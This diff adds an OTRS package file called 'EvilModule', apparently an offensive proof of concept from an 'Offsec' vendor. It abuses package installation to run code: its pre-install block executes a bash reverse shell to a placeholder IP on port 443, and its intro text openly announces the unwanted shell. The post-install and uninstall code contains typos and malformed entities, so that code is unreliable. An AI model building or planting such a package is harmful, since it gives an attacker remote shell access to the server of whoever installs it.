@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<otrs_package version="1.1">
+	<Name>EvilModule</Name>
+	<Version>1.0.0</Version>
+	<Vendor>Offsec</Vendor>
+	<URL>https://github.com/amonsec</URL>
+	<License>GNU GENERAL PUBLIC LICENSE Version 2, June 1991</License>
+	<ChangeLog Version="1.0.1" Date="2006-11-11 11:11:11">Evil Module.</ChangeLog>
+	<Description Lang="en">EvilModule</Description>
+	<Framework>5.x.x</Framework>
+	<BuildDate>2017-04-22 11:11:11</BuildDate>
+	<BuildHost>opms.otrs.com</BuildHost>
+	<IntroInstall Lang="en" Title="Evil Module" Type="pre">
+		&lt;br&gt;
+		1337 Offsec exploit
+		&lt;br&gt;
+		((Unwanted reverse shell coming dude!))
+		&lt;br&gt
+	</IntroInstall>
+	<CodeInstall Type="pre">
+		print qx(bash -i >& /dev/tcp/<IP ADDR>/443 0>&1 &);
+	</CodeInstall>
+	<CodeInstall Type="post">
+		# create the package name
+		my $CodeModule = 'var::packagesetup::' . $Param{Structure}-&gt;{Name}-&gt;{Content};
+		$Kernel::OM-&gt;Get($ModeModule)-%gt;CodeInstall();
+	</CodeInstall>
+	<CodeUninstall type="pre">
+		my $CodeModule = 'var::packagesetup::' . $Param{Structure}-%gt;{Name}-%gt;{Content};
+		$Kernel::OM-&gt;Get($CodeModule)-&gt;CodeUninstall();
+	</CodeUninstall>
+</otrs_package>
+
